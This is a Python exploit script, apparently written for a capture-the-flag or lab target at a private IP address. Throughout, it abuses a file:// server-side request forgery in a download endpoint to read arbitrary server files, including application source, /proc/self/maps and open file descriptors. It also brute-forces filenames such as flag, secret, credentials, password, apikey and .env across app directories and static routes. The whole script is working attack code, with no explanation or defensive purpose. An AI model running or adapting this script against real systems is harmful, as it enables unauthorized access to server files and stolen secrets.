"""Brute-force search for .txt files on the server."""
import requests
import re

T = "http://10.82.168.213"

def read_file(path):
    """Read file via file:// SSRF. Returns content or None."""
    r = requests.get(f"{T}/download?server=file://{path}?&id=1", timeout=6)
    if r.status_code == 200:
        text = r.content.decode(errors="replace")
        if "Werkzeug" not in text and len(r.content) > 0:
            return text
    return None

def check_error(path):
    """Check the error message for a path."""
    r = requests.get(f"{T}/download?server=file://{path}?&id=1", timeout=6)
    if r.status_code == 500:
        err = re.findall(r"Couldn[^<]+", r.text)
        return err[0] if err else None
    return None

# 1. First, let's verify which directories exist by reading known files in them
print("[1] Verifying directory structure...")
known = [
    ("/usr/src/app/app.py", "app dir"),
    ("/usr/src/app/requirements.txt", "requirements"),
    ("/usr/src/app/Dockerfile", "Dockerfile"),
]
for path, desc in known:
    data = read_file(path)
    if data:
        print(f"  OK: {path} ({desc}) - {len(data)} bytes")
    else:
        err = check_error(path)
        print(f"  MISS: {path} ({desc}) - {err}")

# 2. Try reading /proc/self/maps to find loaded files
print("\n[2] Reading /proc/self/maps for file paths...")
maps = read_file("/proc/self/maps")
if maps:
    # Extract unique file paths
    file_paths = set(re.findall(r'/\S+\.(?:py|txt|cfg|ini|conf)', maps))
    for fp in sorted(file_paths):
        print(f"  {fp}")

# 3. Try reading /proc/self/fd/* to find open files
print("\n[3] Checking /proc/self/fd/ for open file descriptors...")
for fd in range(20):
    # Try to read the symlink target
    data = read_file(f"/proc/self/fd/{fd}")
    if data:
        print(f"  fd/{fd}: {data[:100]}")

# 4. Massive filename brute force
print("\n[4] Brute-forcing filenames in various directories...")
dirs = [
    "/usr/src/app",
    "/usr/src/app/static",
    "/usr/src/app/public-docs",
    "/usr/src/app/private-docs",
    "/usr/src",
    "/usr/src/app/templates",
]

names = [
    "flag", "Flag", "FLAG", "secret", "Secret", "note", "notes", "readme",
    "README", "Readme", "info", "config", "credentials", "password",
    "key", "apikey", "api_key", "hint", "todo", "TODO", "text",
    "data", "backup", "old", "test", "hidden", ".flag", ".secret",
    ".hidden", ".env", "env", "robots", "sitemap", "changelog",
    "CHANGELOG", "license", "LICENSE", "VERSION", "version",
]

exts = [".txt", ""]

for d in dirs:
    for name in names:
        for ext in exts:
            filepath = f"{d}/{name}{ext}"
            data = read_file(filepath)
            if data:
                print(f"  [FOUND] {filepath}: {data[:200]}")

# 5. Check via HTTP - Flask static endpoint
print("\n[5] Checking Flask static files via HTTP...")
for name in names:
    for ext in [".txt", ""]:
        url = f"{T}/static/{name}{ext}"
        try:
            r = requests.get(url, timeout=3)
            if r.status_code == 200 and len(r.text) > 0:
                print(f"  [FOUND] {url}: {r.text[:200]}")
        except:
            pass

# 6. Check via public-docs route
print("\n[6] Checking public-docs route via HTTP...")
for name in names:
    for ext in [".txt", ""]:
        url = f"{T}/public-docs-k057230990384293/{name}{ext}"
        try:
            r = requests.get(url, timeout=3)
            if r.status_code == 200 and len(r.text) > 0:
                print(f"  [FOUND] {url}: {r.text[:200]}")
        except:
            pass
